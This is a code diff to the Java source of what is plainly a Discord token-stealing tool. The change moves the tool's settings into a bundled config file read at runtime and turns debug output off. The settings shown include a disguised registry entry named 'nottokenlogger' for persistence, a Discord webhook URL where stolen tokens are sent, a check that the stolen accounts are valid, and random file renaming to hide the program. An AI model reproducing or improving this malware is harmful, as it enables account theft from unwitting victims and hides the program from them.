@@ -1,10 +1,7 @@
 package me.xefer;
 
 import java.io.*;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLConnection;
-import java.net.URLDecoder;
+import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.text.SimpleDateFormat;
@@ -13,7 +10,7 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Main {
-    private static boolean debug = true; // Whether or not everyting should be displayed on terminal window
+    private static boolean debug = false; // Whether or not everyting should be displayed on terminal window
 
     public static void main(String[] args) throws Exception {
         // TODO: Billing information
@@ -22,15 +19,24 @@ public class Main {
 
         // IMPORTANT: Not tested on MacOS or Linux (hopefully works)
 
+        String s = null;
+        StringBuilder configFileString = new StringBuilder();
+        InputStream in = Main.class.getResourceAsStream("webhook.txt");
+        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+        while ((s = reader.readLine()) != null) {
+            configFileString.append(s).append("\n");
+        }
+
         //Settings:
-        String hideAs = "nottokenlogger"; //What the registry entry should be called.
-        String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg"; //If you want to change the webhook icon
-        String discord_username = "nonce"; //Webhook Name (only when embed)
-        String discord_webhook_url = args[0]; //Change this
-        boolean send_embed = false; //True sends embed, False sends it in text
-        boolean ensure_valid = true; //Checks the account before sending (removes if invalid)
-        boolean randomize_new_name = true; //Whether or not a random string shoud be set as the file name
-        boolean shouldPersist = false;
+        String hideAs = getJsonKey(configFileString.toString(), "hide_As"); //What the registry entry should be called.
+        String discord_avatar_url = getJsonKey(configFileString.toString(), "discord_avatar_url"); //If you want to change the webhook icon
+        String discord_username = getJsonKey(configFileString.toString(), "discord_username"); //Webhook Name (only when embed)
+        String discord_webhook_url = getJsonKey(configFileString.toString(), "discord_webhook_url"); // args[0]; //Change this
+        boolean send_embed = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "send_embed")); //True sends embed, False sends it in text
+        boolean ensure_valid = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "ensure_valid")); //Checks the account before sending (removes if invalid)
+        boolean randomize_new_name = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "randomize_new_name")); //Whether or not a random string shoud be set as the file name
+        boolean shouldPersist = Boolean.parseBoolean(getJsonKey(configFileString.toString(), "shouldPersist"));
+
 
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
